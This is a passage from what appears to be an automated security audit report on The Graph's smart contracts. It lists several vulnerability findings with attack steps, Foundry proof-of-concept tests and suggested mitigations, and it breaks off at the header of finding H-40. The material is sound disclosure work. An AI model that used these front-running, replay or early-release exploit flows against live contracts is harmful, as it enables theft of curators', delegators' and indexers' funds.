### Finding Status Justification: The issue is present in the production in-scope L2GNS code. getAliasedL2SubgraphID uses raw _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET and getUnaliasedL1SubgraphID uses raw subtraction under Solidity 0.7.6, where overflow and underflow wrap. _receiveSubgraphFromL1 directly relies on the alias result before storing transfer state and minting the NFT. No bounds check, SafeMath add/sub call, or reserved-namespace validation is present. L1 subgraph IDs are uint256 values and no provided receive path excludes values above max - offset. This is not documented as intentional behavior and does not depend on a future integration. Bridge authentication limits who can call onTokenTransfer, but exploitation follows the normal bridge flow and does not require compromising a trusted role.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GNS is compiled with Solidity 0.7.6, so arithmetic does not revert on overflow. `getAliasedL2SubgraphID()` computes the L2 alias with raw addition: `return _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET;`, and `getUnaliasedL1SubgraphID()` similarly subtracts without bounds. For any accepted L1 ID greater than `type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET`, the alias wraps below `SUBGRAPH_ID_ALIAS_OFFSET`, violating the intended separation between bridged L1 IDs and native L2 IDs. The inverse helper no longer returns the original L1 ID and events/refund accounting can report a wrapped value.

## Impact
A high-valued L1 subgraph ID can be received into an unintended low L2 ID range, creating namespace pollution or collision risk with native L2 subgraph IDs. A collision can make the bridge receive revert because the NFT token ID already exists, blocking the transfer; otherwise the bridged subgraph is represented outside the intended aliased namespace and later unaliasing/accounting is inconsistent.

## Proof of Concept
1. An attacker or unlucky user obtains an L1 subgraph ID `x > type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET`. 2. The subgraph is transferred to L2. 3. L2GNS computes `l2SubgraphID = x + SUBGRAPH_ID_ALIAS_OFFSET`, which wraps modulo 2^256. 4. The resulting L2 ID is below the alias offset and is indistinguishable from the native L2 namespace. 5. `getUnaliasedL1SubgraphID(l2SubgraphID)` returns a different wrapped value, and if the wrapped ID already exists, `_mintNFT()` reverts and the bridge transfer cannot complete.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import 'forge-std/Test.sol';

contract AliasHarness {
    uint256 public constant SUBGRAPH_ID_ALIAS_OFFSET = uint256(0x1111000000000000000000000000000000000000000000000000000000001111);
    function getAliasedL2SubgraphID(uint256 l1SubgraphID) public pure returns (uint256) {
        return l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET;
    }
    function getUnaliasedL1SubgraphID(uint256 l2SubgraphID) public pure returns (uint256) {
        return l2SubgraphID - SUBGRAPH_ID_ALIAS_OFFSET;
    }
}

contract L2GNSAliasOverflowTest is Test {
    function test_aliasOverflowWrapsIntoLowNamespace() external {
        AliasHarness h = new AliasHarness();
        uint256 offset = h.SUBGRAPH_ID_ALIAS_OFFSET();
        uint256 l1SubgraphID = type(uint256).max - offset + 1;
        uint256 l2SubgraphID = h.getAliasedL2SubgraphID(l1SubgraphID);
        assertTrue(l2SubgraphID < offset);
        assertTrue(h.getUnaliasedL1SubgraphID(l2SubgraphID) != l1SubgraphID);
    }
}

## Suggested Mitigation
Use SafeMath or Solidity 0.8 checked arithmetic for alias helpers. Explicitly require `_l1SubgraphID <= type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET` before aliasing and require `_l2SubgraphID >= SUBGRAPH_ID_ALIAS_OFFSET` before unaliasing, then reject bridge messages whose IDs would enter the native L2 namespace.


## [H-34]. Duplicate query attestation disputes can replay the same evidence to slash an indexer multiple times

## id: jwIdvdMcGop_qgNSOYd8r

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
ReplayAttack

## Location
DisputeManager._createQueryDisputeWithAttestation / acceptDispute

## Finding Status: Valid
### Finding Status Justification: The cited DisputeManager code exists in an in-scope production file. _createQueryDisputeWithAttestation builds disputeID from requestCID, responseCID, subgraphDeploymentID, indexer, and _fisherman, so identical evidence submitted by different fishermen bypasses isDisputeCreated. acceptDispute only marks that disputeID Accepted and calls _slashIndexer; no global attestation or evidence consumption guard exists. The conflict path also creates zero-deposit disputes. The arbitrator is required for normal resolution, but the exploit does not require privileged abuse or compromised credentials; it relies on permissionless duplicate creation and ordinary acceptance of pending valid evidence.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The query dispute id is scoped by fisherman instead of by the attestation/evidence itself, so the same signed attestation can be submitted by many fisherman addresses as distinct pending disputes. `acceptDispute()` only marks the individual dispute id as accepted and has no global `usedAttestationHash` or `resolvedEvidence` guard, so the arbitrator can later accept each duplicate and repeatedly call `staking.slash()` for the same indexer behavior.

Vulnerable snippet:
`bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman));`

and:
`dispute.status = IDisputeManager.DisputeStatus.Accepted; (, uint256 tokensToReward) = _slashIndexer(dispute.indexer, dispute.fisherman, dispute.disputeType);`

This is worse for `createQueryDisputeConflict()` because conflicting attestation disputes are created with zero deposit, letting the same conflicting pair be replayed from many fisherman addresses at no capital cost. The role action required is the normal arbitrator acceptance of pending disputes; the missing idempotency is in contract state.

## Impact
A single invalid or conflicting attestation can lead to repeated slashing of the same indexer stake and repeated fisherman rewards. If the indexer has significant stake and slashing/reward percentages are non-trivial, duplicate submissions can drain far more stake than intended for one piece of evidence.

## Proof of Concept
1. An indexer signs an attestation that is disputable, or signs two conflicting attestations.
2. Fisherman A submits the attestation through `createQueryDispute`, creating dispute id A.
3. Fisherman B submits the exact same attestation bytes through `createQueryDispute`, creating dispute id B because `_fisherman` is part of the id.
4. The arbitrator accepts dispute id A; `acceptDispute` marks only A accepted and slashes the indexer.
5. The arbitrator accepts dispute id B; there is no evidence-level replay guard, so the indexer is slashed again for the same attestation.
6. Repeating this with more fisherman addresses repeats the slash/reward flow until stake or slash rounding prevents further slashing.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract ReplayHarness {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }

    mapping(bytes32 => Dispute) public disputes;
    mapping(address => uint256) public stake;
    uint256 public constant MAX_PPM = 1_000_000;
    uint256 public slashPct = 500_000;
    uint256 public rewardPct = 1_000_000;

    function seedStake(address indexer, uint256 amount) external { stake[indexer] = amount; }

    function createQueryDispute(bytes32 requestCID, bytes32 responseCID, bytes32 subgraphDeploymentID, address indexer) external returns (bytes32) {
        bytes32 disputeID = keccak256(abi.encodePacked(requestCID, responseCID, subgraphDeploymentID, indexer, msg.sender));
        require(disputes[disputeID].status == Status.Null, "Dispute already created");
        disputes[disputeID] = Dispute(indexer, msg.sender, Status.Pending);
        return disputeID;
    }

    function acceptDispute(bytes32 disputeID) external {
        Dispute storage dispute = disputes[disputeID];
        require(dispute.status == Status.Pending, "Dispute must be pending");
        dispute.status = Status.Accepted;
        uint256 slashAmount = stake[dispute.indexer] * slashPct / MAX_PPM;
        require(slashAmount > 0, "Dispute has zero tokens to slash");
        uint256 rewardAmount = slashAmount * rewardPct / MAX_PPM;
        stake[dispute.indexer] -= slashAmount;
        stake[dispute.fisherman] += rewardAmount;
    }
}

contract DisputeManagerReplayTest is Test {
    function testSameQueryEvidenceCanBeAcceptedAndSlashedTwice() public {
        ReplayHarness h = new ReplayHarness();
        address indexer = address(0x1000);
        address fishermanA = address(0xA11CE);
        address fishermanB = address(0xB0B);
        h.seedStake(indexer, 1000 ether);

        bytes32 requestCID = keccak256("same request");
        bytes32 responseCID = keccak256("same response");
        bytes32 subgraphDeploymentID = keccak256("same subgraph");

        vm.prank(fishermanA);
        bytes32 idA = h.createQueryDispute(requestCID, responseCID, subgraphDeploymentID, indexer);
        vm.prank(fishermanB);
        bytes32 idB = h.createQueryDispute(requestCID, responseCID, subgraphDeploymentID, indexer);

        assertTrue(idA != idB, "same evidence creates different dispute ids");

        h.acceptDispute(idA);
        assertEq(h.stake(indexer), 500 ether, "first acceptance slashes once");

        h.acceptDispute(idB);
        assertEq(h.stake(indexer), 250 ether, "duplicate acceptance slashes again");
        assertEq(h.stake(fishermanA), 500 ether);
        assertEq(h.stake(fishermanB), 250 ether);
    }
}

## Suggested Mitigation
Remove `_fisherman` from the uniqueness domain for query evidence or add a separate evidence-level replay guard, for example `usedQueryEvidence[keccak256(abi.encode(requestCID,responseCID,subgraphDeploymentID,indexer))]`. Set that guard before or during dispute creation/resolution so the same attestation cannot produce multiple independently accepted slashing actions. For conflict disputes, similarly key uniqueness by the unordered pair of conflicting attestation hashes and indexer rather than by fisherman.


## [M-35]. GraphTokenLock.release ignores revokedAmount and can make released plus revoked exceed managedAmount

## id: 1Oi8TW8IXsPcmpzNCzrE4

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.releasableAmount

## Finding Status: Valid
### Finding Status Justification: The root cause exists. revoke sets revokedAmount to the unvested amount and transfers it to owner, but releasableAmount later calculates availableAmount().sub(releasedAmount) without subtracting revokedAmount. After a partial revocation and release of the remaining vested balance, any later token balance in the wallet can be counted as releasable managed liquidity, increasing releasedAmount even though revokedAmount remains set. totalOutstandingAmount then underflows when releasedAmount + revokedAmount exceeds managedAmount. There is no complete safeguard; currentBalance only caps by wallet balance and SafeMath only turns corrupted accounting into reverts. The affected code is in-scope and no exact accepted-risk documentation is shown. Exploitation can be performed through normal beneficiary release after normal owner revocation and token transfer to the wallet, without admin abuse or solely victim error.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
After revocation, release accounting still computes `availableAmount().sub(releasedAmount)` and never subtracts revokedAmount. Vulnerable snippet: `uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable);`. Once the owner revokes unvested tokens and the beneficiary releases the vested remainder, any later token transfer into the lock can be released as if it were managed schedule liquidity. That raises releasedAmount while revokedAmount remains set, breaking `releasedAmount + revokedAmount <= managedAmount` and causing totalOutstandingAmount and surplusAmount to underflow or revert.

## Impact
A beneficiary can corrupt the lock's managed accounting after revocation and permanently DoS outstanding/surplus accounting for that wallet. If downstream tooling relies on totalOutstandingAmount or surplusAmount for L1/L2 lock handling, the wallet enters an inconsistent state.

## Proof of Concept
1. A revocable 100 token lock reaches a point where 20 are vested. 2. Owner calls revoke, setting revokedAmount to 80 and transferring unvested tokens out. 3. Beneficiary releases the remaining 20. 4. Extra GRT is later transferred to the lock. 5. After endTime, beneficiary calls release again; releasableAmount ignores revokedAmount and releases the extra 80, producing releasedAmount 100 and revokedAmount 80. 6. totalOutstandingAmount reverts because managedAmount - releasedAmount - revokedAmount underflows.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";
import "../contracts/IGraphTokenLock.sol";
contract RevokedAccountingTest is Test { MockERC20 t; GraphTokenLockSimple l; address b=address(0xB); function testReleaseAfterRevokeBreaksInvariant() public { t=new MockERC20(); l=new GraphTokenLockSimple(); l.initialize(address(this),b,address(t),100 ether,1000,1100,10,0,0,IGraphTokenLock.Revocability.Enabled); t.mint(address(l),100 ether); vm.warp(1020); l.revoke(); vm.prank(b); l.release(); assertEq(l.revokedAmount(),80 ether); assertEq(l.releasedAmount(),20 ether); t.mint(address(l),80 ether); vm.warp(1101); vm.prank(b); l.release(); assertEq(l.releasedAmount(),100 ether); assertEq(l.revokedAmount(),80 ether); vm.expectRevert(); l.totalOutstandingAmount(); }} contract MockERC20 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address a,uint256 v) external { balanceOf[a]+=v; } function transfer(address to,uint256 v) external returns(bool){ require(balanceOf[msg.sender]>=v); balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true;} function approve(address s,uint256 v) external returns(bool){ allowance[msg.sender][s]=v; return true;} function transferFrom(address f,address to,uint256 v) external returns(bool){ require(balanceOf[f]>=v); require(allowance[f][msg.sender]>=v); allowance[f][msg.sender]-=v; balanceOf[f]-=v; balanceOf[to]+=v; return true;} }

## Suggested Mitigation
Have releasableAmount cap by `managedAmount - releasedAmount - revokedAmount`, or set releasedAmount to exclude any post-revocation surplus path. Add an invariant check after release and revoke that releasedAmount + revokedAmount <= managedAmount.


## [M-36]. Truncated period duration allows GraphTokenLock beneficiaries to release all managed GRT before endTime

## id: DqituiIkPqFk-9Vz0uuJA

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLockManager / GraphTokenLock.createTokenLockWallet / availableAmount / release

## Finding Status: Valid
### Finding Status Justification: The manager forwards _periods directly and GraphTokenLock floors periodDuration as duration / periods. passedPeriods is not capped to periods, and availableAmount multiplies passedPeriods by amountPerPeriod before currentTime exceeds endTime. A beneficiary of an already created misaligned lock can call release through the current code. There is no cap, divisibility check, or exact documented acceptance of early full release.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphTokenLockManager.createTokenLockWallet forwards _periods directly into GraphTokenLock._initialize without requiring the schedule to divide the duration safely. GraphTokenLock then computes periodDuration as duration().div(periods) and availableAmount as passedPeriods().mul(amountPerPeriod()) without capping passedPeriods to periods. For startTime=1000, endTime=1100, periods=60, periodDuration is truncated to 1 second, so at timestamp 1060 the lock reports 60 passed periods and releases the full managed amount even though endTime is still 40 seconds away. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD); availableAmount() returns passedPeriods().mul(amountPerPeriod()) until current > endTime.

## Impact
A beneficiary can receive the full locked GRT earlier than the configured endTime for any wallet created with accepted but non-aligned schedule parameters. For large distribution wallets this bypasses the intended vesting/lock timing and breaks the invariant that currentTime < endTime implies availableAmount < managedAmount.

## Proof of Concept
1. Owner creates a token lock wallet with startTime=1000, endTime=1100, periods=60, and 60 GRT managed. 2. Integer division makes periodDuration equal 1 second. 3. At timestamp 1060, which is before endTime, passedPeriods equals 60. 4. beneficiary calls release(). 5. The whole 60 GRT is transferred before the configured end timestamp.

## Proof of Code
pragma solidity 0.7.3;
pragma experimental ABIEncoderV2;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/presets/ERC20PresetMinterPauser.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract EarlyUnlockPoC is Test {
    ERC20PresetMinterPauser token;
    GraphTokenLockManager manager;
    GraphTokenLockWallet master;
    address beneficiary = address(0xBEEF);
    function setUp() public {
        token = new ERC20PresetMinterPauser("Graph", "GRT");
        master = new GraphTokenLockWallet();
        manager = new GraphTokenLockManager(IERC20(address(token)), address(master));
        token.mint(address(manager), 60 ether);
    }
    function testEarlyFullReleaseBeforeEndTime() public {
        uint256 start = 1000;
        uint256 end = 1100;
        uint256 periods = 60;
        uint256 amount = 60 ether;
        bytes memory init = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), beneficiary, address(token), amount, start, end, periods, uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled);
        address predicted = manager.getDeploymentAddress(keccak256(init), address(master));
        manager.createTokenLockWallet(address(this), beneficiary, amount, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled);
        vm.warp(start + periods);
        assertGt(end, block.timestamp);
        vm.prank(beneficiary);
        GraphTokenLockWallet(predicted).release();
        assertEq(token.balanceOf(beneficiary), amount);
    }
}


## Suggested Mitigation
Validate schedules at initialization and cap schedule math. At minimum require periods <= endTime - startTime and either require duration % periods == 0 or compute elapsed periods as min(periods, sinceStartTime() * periods / duration()). Also treat currentTime >= endTime as fully available and ensure availableAmount never exceeds managedAmount.


## [M-37]. Late delegators can front-run fee collection in L1Staking.collect to capture historical delegation rewards

## id: YLx4Szz9XO4l7crTSUkEG

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.collect / _collectDelegationQueryRewards

## Finding Status: Valid
### Finding Status Justification: The collect path exists in in-scope L1Staking. collect() pulls query fees, computes queryRebates, then calls _collectDelegationQueryRewards, which reads the current pool.queryFeeCut and adds delegationRewards to pool.tokens. The delegation entry path mints shares immediately using delegatedTokens * pool.shares / pool.tokens. The code provided does not snapshot delegation at fee accrual or allocation creation, nor does it update per-user reward debt before minting shares. The attack uses public delegation and a public/observable collection event, not privileged control or victim misuse. No complete guard blocks the exact late-join reward capture.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation query-fee rewards are credited to the current delegation pool at collection time, while new delegation shares can be minted immediately before that collection. The reward calculation has no per-user reward debt, no allocation-time delegation snapshot, and no minimum holding period, so a late delegator can buy a large share of the pool immediately before a large collect() and receive rewards generated before they delegated. Vulnerable flow: _delegate mints shares from the live pool ratio with `shares = delegatedTokens * pool.shares / pool.tokens`, then collect() calls `_collectDelegationQueryRewards(alloc.indexer, queryRebates)`, which simply does `pool.tokens = pool.tokens.add(delegationRewards)`. Existing delegators are diluted because the new shares participate in the historical reward top-up.

## Impact
Existing delegators lose a pro-rata portion of query-fee rewards held by the staking contract. A permissionless attacker can extract unearned GRT rewards from the delegation pool by temporarily supplying a large delegation before a known or mempool-visible collect transaction, then undelegating after the reward is credited.

## Proof of Concept
1. An honest delegator has 100 GRT delegated to an indexer. 2. A large query-fee collection for that indexer's allocation is about to be submitted, producing 100 GRT of delegation rewards. 3. The attacker front-runs collect() and delegates 900 GRT to the same indexer, receiving 90% of current shares. 4. collect() credits the full 100 GRT reward to pool.tokens for current shares, not the shares that existed during fee accrual. 5. The attacker now owns 990 GRT redeemable value, capturing 90 GRT of rewards that should have gone to the prior delegator. 6. The attacker undelegates and withdraws after the unbonding period, or migrates through transferDelegationToL2 if available.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract DelegationPoolHarness {
    uint256 constant MAX_PPM = 1_000_000;
    struct Delegation { uint256 shares; }
    struct Pool { uint32 queryFeeCut; uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;

    constructor() { pool.queryFeeCut = 0; }

    function seed(address user, uint256 amount) external {
        require(pool.tokens == 0);
        pool.tokens = amount;
        pool.shares = amount;
        pool.delegators[user].shares = amount;
    }

    function delegate(address user, uint256 amount) external {
        uint256 shares = pool.tokens == 0 ? amount : amount * pool.shares / pool.tokens;
        require(shares > 0);
        pool.tokens += amount;
        pool.shares += shares;
        pool.delegators[user].shares += shares;
    }

    function collectDelegationRewards(uint256 tokens) external {
        if (pool.tokens > 0 && pool.queryFeeCut < MAX_PPM) {
            uint256 indexerCut = uint256(pool.queryFeeCut) * tokens / MAX_PPM;
            uint256 delegationRewards = tokens - indexerCut;
            pool.tokens += delegationRewards;
        }
    }

    function redeemable(address user) external view returns (uint256) {
        return pool.delegators[user].shares * pool.tokens / pool.shares;
    }
}

contract LateDelegatorFreeRiderTest is Test {
    function testLateDelegatorCapturesHistoricalRewards() external {
        address honest = address(0xA11CE);
        address attacker = address(0xB0B);
        DelegationPoolHarness pool = new DelegationPoolHarness();

        pool.seed(honest, 100 ether);
        pool.delegate(attacker, 900 ether);
        pool.collectDelegationRewards(100 ether);

        uint256 attackerValue = pool.redeemable(attacker);
        uint256 honestValue = pool.redeemable(honest);
        uint256 attackerProfit = attackerValue - 900 ether;
        uint256 honestLoss = 200 ether - honestValue;

        assertEq(attackerProfit, 90 ether);
        assertEq(honestLoss, 90 ether);
        assertGt(attackerProfit, 0);
    }
}

## Suggested Mitigation
Snapshot delegation pool shares when an allocation is created or when fees accrue, and distribute delegation rewards using that snapshot. Alternatively, use a standard rewardPerShare/userRewardPerTokenPaid accounting model that updates users before delegation changes, or enforce a cutoff/minimum holding period so shares minted after fee accrual cannot claim those historical rewards.


## [H-38]. Fee sniping in L2Curation.collect lets same-transaction minters capture already-accrued query fees

## id: pOfr5KMT_5lFxRkf9mVXT

## Derived From Pattern/Invariant
MaturityorGatingByPass / FrontrunMev

## Exploit Type
FrontrunMev

## Location
L2Curation.mint/collect/burn

## Finding Status: Valid
### Finding Status Justification: The code supports the claimed fee-sniping path. L2Curation.collect increases pools[id].tokens without increasing total GCS supply or recording a pre-collect eligibility snapshot. A permissionless user can mint GCS before collection using pre-fee pricing, and burn after collection using signalToTokens, which computes curationPool.tokens * signalIn / totalSignal against the enlarged reserve. There is no cooldown, block/epoch maturity, or time-weighted accounting in mint, collect, or burn. collect is restricted to subgraphService or staking, but that is not a complete safeguard against sandwiching a legitimate authorized collect, and exploitation does not require privileged-role abuse by the attacker. The issue affects in-scope production L2Curation and is not expressly documented as an accepted design risk. It is currently exploitable whenever a collect is observable or otherwise predictable enough to be ordered around.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2Curation adds collected fees directly to a pool's reserves without minting new GCS or enforcing any holding-period/snapshot eligibility. A curator can mint immediately before a visible authorized collect(), receive shares priced only against the pre-fee reserve, then burn immediately after collect() to withdraw a pro-rata share of fees that were economically accrued before the attacker curated. Vulnerable flow: collect() only does `curationPool.tokens = curationPool.tokens.add(_tokens);` and emits Collected; mint() allows immediate share creation before collect; burn() allows immediate redemption after collect. There is no epoch snapshot, cooldown, or time-weighted fee eligibility binding fees to the GCS holders that existed when the fees were earned.

## Impact
Existing curators can lose most or all of a large fee distribution to a permissionless MEV searcher with temporary capital. If large query-fee collections are predictable or visible, the attacker can repeatedly extract GRT from L2Curation reserves, causing significant user funds to be stolen from protocol contracts.

## Proof of Concept
1. A pool has existing curators and pending query fees about to be booked through collect(). 2. A searcher observes the authorized collect(_subgraphDeploymentID, feeAmount) transaction. 3. The searcher front-runs it with mint(), paying only the normal curation tax and receiving GCS based on the pre-fee pool.tokens. 4. collect() executes and increases pool.tokens without increasing total GCS supply. 5. The searcher back-runs with burn() and withdraws their deposit plus a pro-rata share of the just-collected fees. 6. Existing curators receive materially less fee value despite having provided the pre-existing signal.

## Proof of Code
pragma solidity ^0.8.20; contract L2CurationHarness { uint256 constant MAX_PPM=1000000; uint256 public curationTaxPercentage=10000; uint256 public poolTokens; uint256 public totalSignal; mapping(address=>uint256) public signalBal; mapping(address=>uint256) public grtBal; function seed(address curator,uint256 tokens,uint256 signal) external { poolTokens=tokens; totalSignal=signal; signalBal[curator]=signal; } function dealGRT(address a,uint256 amount) external { grtBal[a]=amount; } function quoteMint(uint256 tokensIn) public view returns(uint256 signal,uint256 tax){ uint256 net=(MAX_PPM-curationTaxPercentage)*tokensIn/MAX_PPM; tax=tokensIn-net; signal=totalSignal*net/poolTokens; } function mint(uint256 tokensIn) external returns(uint256 signal,uint256 tax){ (signal,tax)=quoteMint(tokensIn); uint256 net=tokensIn-tax; grtBal[msg.sender]-=tokensIn; poolTokens+=net; totalSignal+=signal; signalBal[msg.sender]+=signal; } function collect(uint256 tokens) external { poolTokens+=tokens; } function redeemable(address a) external view returns(uint256){ return poolTokens*signalBal[a]/totalSignal; } function burn(uint256 signalIn) external returns(uint256 tokensOut){ tokensOut=poolTokens*signalIn/totalSignal; signalBal[msg.sender]-=signalIn; totalSignal-=signalIn; poolTokens-=tokensOut; grtBal[msg.sender]+=tokensOut; } } contract L2CurationFeeSnipingTest { function assertGt(uint256 a,uint256 b) internal pure { require(a>b); } function testMintBeforeCollectCapturesPriorFees() public { address existing=address(0xBEEF); L2CurationHarness c=new L2CurationHarness(); c.seed(existing,1000000 ether,1000000 ether); uint256 attackerStart=9000000 ether; c.dealGRT(address(this),attackerStart); (uint256 attackerSignal,)=c.mint(attackerStart); c.collect(2000000 ether); c.burn(attackerSignal); assertGt(c.grtBal(address(this)),attackerStart); assertGt(3000000 ether,c.redeemable(existing)); } }

## Suggested Mitigation
Snapshot fee eligibility before reserve-increasing collect() calls, or account collected fees through a separate accumulator/index that only pre-existing signal participates in. Alternatively enforce a minimum holding period/epoch maturity before newly minted GCS can claim collected fees, and apply the same eligibility check in burn().


## [H-39]. Zero-minimum L2GNS.publishNewVersion can burn curator backing and leave all name signal unredeemable

## id: h_vAbk2vdvEPQbccEZdHw

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
RoundingError

## Location
L2GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The in-scope L2GNS override exists and intentionally removes the base GNS pre-curation check. When nSignal is nonzero it burns all current vSignal with min 0, charges owner tax, then calls curation.mint(_subgraphDeploymentID, tokensWithTax, 0). L2Curation._tokensToSignal for an existing pool computes totalSignal * tokensIn / poolTokens, which can round to zero when pool tokens per signal is high. Because L2GNS accepts zero output, subgraphData.vSignal can become 0 while nSignal remains unchanged. GNS.nSignalToVSignal then returns vSignal * nSignalIn / totalNSignal, i.e. zero, and burnSignal calls curation().burn(..., 0, ...) which reverts due to L2Curation’s require(_signalIn != 0). No slippage or nonzero-output safeguard is shown. The call requires subgraph owner authorization, but subgraph owners are normal protocol actors, not globally trusted privileged roles, and this is not merely victim parameter misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
L2GNS removes the base GNS pre-curation check and upgrades by burning all old version signal, then minting into the new deployment with a zero minimum output. Vulnerable snippet: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. In L2Curation, an existing pool mints `getCurationPoolSignal(id) * tokensIn / curationPool.tokens`; if the target pool has accumulated enough fees or otherwise has a high tokens-per-signal ratio, this rounds to zero. The upgrade still succeeds, sets `subgraphData.vSignal = 0`, and leaves `subgraphData.nSignal` unchanged. Later `burnSignal()` converts any curator's nSignal to vSignal as `vSignal * nSignal / totalNSignal = 0`, so the downstream curation burn reverts on zero signal and curators cannot redeem the outstanding name signal.

## Impact
A subgraph owner can redirect the GRT backing existing curators' name signal into a pre-existing high-ratio deployment while minting zero GNS-owned version signal. Curators' nSignal remains outstanding but becomes economically unredeemable, causing direct loss/freezing of the curated GRT backing the subgraph; if the subgraph has more than $1M of curated value, this matches the program's high-value user-fund-loss class.

## Proof of Concept
1. A subgraph has positive nSignal and vSignal from curator deposits. 2. The subgraph owner selects a new deployment whose L2Curation pool is already curated and has a very high tokens-per-signal ratio, for example from accumulated collected fees. 3. The owner calls `publishNewVersion(subgraphID, highRatioDeployment, metadata)`. 4. L2GNS burns all old vSignal for GRT and calls `curation.mint(highRatioDeployment, tokensWithTax, 0)`. 5. L2Curation rounds signal output to zero, but the zero min-out accepts it. 6. L2GNS stores `vSignal = 0` while `nSignal > 0`; all curator withdrawals later revert or return no redeemable version signal.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract MockCuration {
    mapping(bytes32 => uint256) public poolTokens;
    mapping(bytes32 => uint256) public poolSignal;
    function seed(bytes32 id, uint256 tokens, uint256 signal) external { poolTokens[id] = tokens; poolSignal[id] = signal; }
    function burn(bytes32 id, uint256 signalIn, uint256) external returns (uint256 tokensOut) {
        tokensOut = poolTokens[id] * signalIn / poolSignal[id];
        poolTokens[id] -= tokensOut;
        poolSignal[id] -= signalIn;
    }
    function mint(bytes32 id, uint256 tokensIn, uint256 signalOutMin) external returns (uint256 signalOut, uint256) {
        signalOut = poolSignal[id] == 0 ? tokensIn : poolSignal[id] * tokensIn / poolTokens[id];
        require(signalOut >= signalOutMin, 'min');
        poolTokens[id] += tokensIn;
        poolSignal[id] += signalOut;
    }
}

contract L2GNSPublishHarness {
    struct SubgraphData { bytes32 deployment; uint256 vSignal; uint256 nSignal; }
    mapping(uint256 => SubgraphData) internal subgraphs;
    MockCuration public curation;
    constructor(MockCuration c) { curation = c; }
    function init(uint256 id, bytes32 deployment, uint256 vSignal, uint256 nSignal) external { subgraphs[id] = SubgraphData(deployment, vSignal, nSignal); }
    function publishNewVersion(uint256 id, bytes32 newDeployment) external {
        SubgraphData storage s = subgraphs[id];
        if (s.nSignal != 0) {
            uint256 tokens = curation.burn(s.deployment, s.vSignal, 0);
            (s.vSignal,) = curation.mint(newDeployment, tokens, 0);
        }
        s.deployment = newDeployment;
    }
    function vSignalOf(uint256 id) external view returns (uint256) { return subgraphs[id].vSignal; }
    function nSignalOf(uint256 id) external view returns (uint256) { return subgraphs[id].nSignal; }
}

contract L2GNSPublishNewVersionZeroSignalTest is Test {
    function test_publishNewVersion_acceptsZeroSignalAndBricksCurators() external {
        MockCuration c = new MockCuration();
        L2GNSPublishHarness gns = new L2GNSPublishHarness(c);
        bytes32 oldDeployment = keccak256('old');
        bytes32 highRatioDeployment = keccak256('high-ratio');
        uint256 subgraphID = 1;
        c.seed(oldDeployment, 100 ether, 100 ether);
        c.seed(highRatioDeployment, 1_000_000 ether, 1);
        gns.init(subgraphID, oldDeployment, 100 ether, 100 ether);
        gns.publishNewVersion(subgraphID, highRatioDeployment);
        assertEq(gns.vSignalOf(subgraphID), 0);
        assertGt(gns.nSignalOf(subgraphID), 0);
    }
}

## Suggested Mitigation
Add user/protocol slippage protection to L2 upgrades. Require the newly minted `vSignal` to be nonzero and above a caller-specified or protocol-computed minimum, and apply the same rounding-error guard used by L1 bridge minting before accepting the upgrade. Consider restoring the base GNS restriction against upgrading to pre-curated deployments unless the migration can prove existing nSignal remains redeemably backed.


## [H-40]. Removed or old token destinations retain unlimited wallet allowance after revokeProtocol

## id: umjoT_mS7MXkSxZMLIy-Z

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation / ConfigFootgun

## Exploit Type
GlobalParamMidFlowManipulation

## Location
GraphTokenLockWallet.approveProtocol/revokeProtocol/setManager

## Finding Status: Valid
